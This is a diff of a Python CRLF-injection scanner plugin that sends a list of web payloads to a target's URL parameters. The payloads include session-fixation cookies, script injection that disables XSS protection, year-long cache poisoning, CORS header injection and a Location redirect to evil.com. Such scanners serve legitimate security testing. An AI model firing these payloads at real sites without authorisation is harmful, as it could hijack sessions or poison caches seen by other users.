@@ -2,62 +2,88 @@
 def run(target, ip, open_ports, banners):
     """
     Scanner CRLF Injection (HTTP Response Splitting).
-    Testa injeção de headers via CRLF em parâmetros GET.
-    Detecta: HTTP Response Splitting, XSS via CRLF, Cache Poisoning.
+    2026 Intel: CVE-2024-52875 (KerioControl CRLF→XSS→root), cache poisoning,
+    XSS protection disable, cookie injection, log poisoning, email header injection.
     """
     import requests
 
-    params = ["url", "redirect", "next", "return", "path", "page", "lang", "ref", "goto"]
+    params = ["url", "redirect", "next", "return", "path", "page", "lang", "ref",
+              "goto", "dest", "continue", "forward", "location", "uri", "callback"]
     payloads = [
-        "%0d%0aInjected-Header:CascavelTest",
-        "%0d%0a%0d%0a<html>CRLFTest</html>",
-        "%0d%0aSet-Cookie:crlftest=true",
-        "%0D%0AX-Custom:CascavelCRLF",
-        "\r\nInjected-Header:CascavelTest",
-        "%E5%98%8A%E5%98%8DInjected:UnicodeCRLF",  # Unicode bypass
+        # Standard CRLF
+        ("%0d%0aInjected-Header:CascavelTest", "CRLF_BASIC"),
+        ("%0d%0a%0d%0a<html>CRLFTest</html>", "RESPONSE_SPLITTING"),
+        # Session fixation
+        ("%0d%0aSet-Cookie:session=pwned;Path=/", "SESSION_FIXATION"),
+        # XSS protection disable (CVE-2024-52875 chain)
+        ("%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>", "XSS_PROTECTION_DISABLE"),
+        # Cache poisoning
+        ("%0d%0aCache-Control:public,max-age=31536000%0d%0a%0d%0aPOISONED", "CACHE_POISON"),
+        # Content-Type override
+        ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CRLF</h1>", "CONTENT_TYPE_OVERRIDE"),
+        # Unicode CRLF bypass (UTF-8)
+        ("%E5%98%8A%E5%98%8DInjected:UnicodeCRLF", "UNICODE_BYPASS"),
+        # Double encoding
+        ("%250d%250aInjected:DoubleEncode", "DOUBLE_ENCODE"),
+        # Raw CRLF
+        ("\r\nInjected-Header:RawCRLF", "RAW_CRLF"),
+        # Line feed only
+        ("%0aInjected:LF-Only", "LF_ONLY"),
+        # Header injection for CORS bypass
+        ("%0d%0aAccess-Control-Allow-Origin:*", "CORS_INJECTION"),
+        # Location header injection (open redirect chain)
+        ("%0d%0aLocation:https://evil.com", "LOCATION_INJECTION"),
     ]
     vulns = []
 
     for param in params:
-        for payload in payloads:
+        for payload, method in payloads:
             url = f"http://{target}/?{param}={payload}"
             try:
                 resp = requests.get(url, timeout=6, allow_redirects=False)
 
-                # Verificar se o header injetado aparece na resposta
-                for header_nome, header_valor in resp.headers.items():
-                    header_lower = header_nome.lower()
-                    if "injected" in header_lower or "cascavel" in header_valor.lower():
-                        vuln = {
+                # Check injected headers
+                for h_name, h_val in resp.headers.items():
+                    h_low = h_name.lower()
+                    if "injected" in h_low or "cascavel" in h_val.lower() or "unicodecrlf" in h_val.lower():
+                        sev = "ALTO"
+                        if method == "SESSION_FIXATION":
+                            sev = "CRITICO"
+                        elif method == "XSS_PROTECTION_DISABLE":
+                            sev = "CRITICO"
+                        elif method == "CORS_INJECTION":
+                            sev = "CRITICO"
+
+                        vulns.append({
                             "tipo": "CRLF_INJECTION",
+                            "metodo": method,
                             "parametro": param,
-                            "payload": payload,
-                            "header_injetado": f"{header_nome}: {header_valor}",
-                            "severidade": "ALTO",
-                        }
-                        # Classificar tipo
-                        if "set-cookie" in payload.lower():
-                            vuln["subtipo"] = "SESSION_FIXATION"
-                            vuln["severidade"] = "CRITICO"
-                        elif "<html>" in payload:
-                            vuln["subtipo"] = "RESPONSE_SPLITTING"
-                            vuln["severidade"] = "CRITICO"
-                        vulns.append(vuln)
+                            "header_injetado": f"{h_name}: {h_val}",
+                            "severidade": sev,
+                        })
                         break
 
-                # Verificar body split
-                if "<html>CRLFTest</html>" in resp.text and "CRLFTest" not in url.replace(payload, ""):
+                # Check body split
+                if "CRLFTest" in resp.text or "POISONED" in resp.text or "<h1>CRLF</h1>" in resp.text:
                     vulns.append({
                         "tipo": "HTTP_RESPONSE_SPLITTING",
+                        "metodo": method,
                         "parametro": param,
-                        "payload": payload,
                         "severidade": "CRITICO",
-                        "descricao": "Body injetado via CRLF — full response splitting"
+                        "descricao": "Full HTTP response splitting — body injetado!",
                     })
+
+                # Check Set-Cookie injection
+                for cookie_header in resp.headers.get("Set-Cookie", "").split(","):
+                    if "session=pwned" in cookie_header.lower():
+                        vulns.append({
+                            "tipo": "SESSION_FIXATION",
+                            "metodo": "CRLF_COOKIE_INJECTION",
+                            "parametro": param,
+                            "severidade": "CRITICO",
+                        })
+
             except Exception:
                 continue
 
-    return {
-        "plugin": "crlf_scanner",
-        "resultados": vulns if vulns else "Nenhuma vulnerabilidade CRLF detectada"
-    }
+    return {"plugin": "crlf_scanner", "resultados": vulns if vulns else "Nenhuma vulnerabilidade CRLF detectada"}
